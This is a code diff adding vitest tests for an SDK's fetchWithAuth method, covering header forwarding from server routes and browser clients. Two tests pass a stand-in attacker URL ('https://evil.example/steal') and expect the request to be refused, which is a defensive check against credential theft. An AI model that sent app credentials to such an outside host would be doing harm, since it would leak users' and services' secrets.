@@ -1,5 +1,5 @@
 import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
-import { createClient } from "../../src/index.ts";
+import { createClient, createClientFromRequest } from "../../src/index.ts";
 
 const appId = "test-app-id";
 const origin = "https://my-app.base44.app";
@@ -189,5 +189,149 @@ describe("fetchWithAuth", () => {
       base44.fetchWithAuth("https://evil.example/steal")
     ).rejects.toThrow(/only sends requests to your app's own origin/);
     expect(fetchMock).not.toHaveBeenCalled();
+  });
+});
+
+const apiUrl = "https://base44.app";
+
+/** The header set the platform puts on a fullstack worker request. */
+function inboundRequest(
+  overrides: Record<string, string | undefined> = {}
+): Request {
+  const headers: Record<string, string> = {
+    Authorization: "Bearer caller-user-token",
+    "Base44-Service-Authorization": "Bearer service-credential",
+    "Base44-App-Id": appId,
+    "Base44-Api-Url": apiUrl,
+    "Base44-Functions-Version": "draft",
+    "Base44-State": "signed-state-jwt",
+    "X-Data-Env": "dev",
+    host: "my-app.base44.app",
+    cookie: "session=irrelevant",
+  };
+  for (const [name, value] of Object.entries(overrides)) {
+    if (value === undefined) delete headers[name];
+    else headers[name] = value;
+  }
+  return new Request(`${origin}/page`, { headers });
+}
+
+describe("fetchWithAuth from a server route", () => {
+  test("sends every header createClientFromRequest reads, so the callee rebuilds the same client", async () => {
+    const base44 = createClientFromRequest(inboundRequest());
+
+    await base44.fetchWithAuth("/api/items", { fetch: fetchMock });
+
+    const { url, headers } = lastCall();
+    expect(url).toBe("/api/items");
+    expect(headers.get("Authorization")).toBe("Bearer caller-user-token");
+    expect(headers.get("Base44-App-Id")).toBe(appId);
+    expect(headers.get("Base44-Api-Url")).toBe(apiUrl);
+    expect(headers.get("Base44-Functions-Version")).toBe("draft");
+    expect(headers.get("Base44-State")).toBe("signed-state-jwt");
+    expect(headers.get("X-Data-Env")).toBe("dev");
+  });
+
+  test("carries the service credential, so asServiceRole works in the callee", async () => {
+    const base44 = createClientFromRequest(inboundRequest());
+
+    await base44.fetchWithAuth("/api/items", { fetch: fetchMock });
+
+    expect(lastCall().headers.get("Base44-Service-Authorization")).toBe(
+      "Bearer service-credential"
+    );
+  });
+
+  test("does not forward host, which would repoint the sub-request's origin", async () => {
+    const base44 = createClientFromRequest(inboundRequest());
+
+    await base44.fetchWithAuth("/api/items", { fetch: fetchMock });
+
+    expect(lastCall().headers.has("host")).toBe(false);
+  });
+
+  test("forwards nothing from the inbound request beyond that set", async () => {
+    const base44 = createClientFromRequest(inboundRequest());
+
+    await base44.fetchWithAuth("/api/items", { fetch: fetchMock });
+
+    expect(lastCall().headers.has("cookie")).toBe(false);
+  });
+
+  test("stays anonymous when the caller is", async () => {
+    const base44 = createClientFromRequest(
+      inboundRequest({ Authorization: undefined })
+    );
+
+    await base44.fetchWithAuth("/api/items", { fetch: fetchMock });
+
+    const { headers } = lastCall();
+    expect(headers.has("Authorization")).toBe(false);
+    expect(headers.get("Base44-Service-Authorization")).toBe(
+      "Bearer service-credential"
+    );
+  });
+
+  test("omits headers the inbound request did not carry", async () => {
+    const base44 = createClientFromRequest(
+      inboundRequest({
+        "Base44-State": undefined,
+        "X-Data-Env": undefined,
+        "Base44-Functions-Version": undefined,
+      })
+    );
+
+    await base44.fetchWithAuth("/api/items", { fetch: fetchMock });
+
+    const { headers } = lastCall();
+    expect(headers.has("Base44-State")).toBe(false);
+    expect(headers.has("X-Data-Env")).toBe(false);
+    expect(headers.has("Base44-Functions-Version")).toBe(false);
+  });
+
+  test("renders as anonymous when the caller drops Authorization on purpose", async () => {
+    const base44 = createClientFromRequest(inboundRequest());
+
+    await base44.fetchWithAuth("/api/items", {
+      fetch: fetchMock,
+      headers: { Authorization: "" },
+    });
+
+    expect(lastCall().headers.get("Authorization")).toBe("");
+  });
+
+  test("uses the given transport and does not pass it on as request init", async () => {
+    vi.stubGlobal("fetch", vi.fn());
+    const base44 = createClientFromRequest(inboundRequest());
+
+    await base44.fetchWithAuth("/api/items", { fetch: fetchMock });
+
+    expect(fetchMock).toHaveBeenCalledOnce();
+    expect(lastCall().init).not.toHaveProperty("fetch");
+  });
+
+  test("refuses to send the app's credentials to another origin", async () => {
+    const base44 = createClientFromRequest(inboundRequest());
+
+    await expect(
+      base44.fetchWithAuth("https://evil.example/steal", { fetch: fetchMock })
+    ).rejects.toThrow(/only sends requests to your app's own origin/);
+    expect(fetchMock).not.toHaveBeenCalled();
+  });
+});
+
+describe("fetchWithAuth in a browser", () => {
+  // The reason one method can serve both: a browser client is built without a
+  // serviceToken, so there is no service credential for it to send. This is
+  // what makes the wider header set safe to apply everywhere.
+  test("sends no service credential, having none", async () => {
+    stubBrowser();
+    const base44 = createTestClient("user-token");
+
+    await base44.fetchWithAuth("/api/orders");
+
+    const { headers } = lastCall();
+    expect(headers.get("Authorization")).toBe("Bearer user-token");
+    expect(headers.has("Base44-Service-Authorization")).toBe(false);
   });
 });
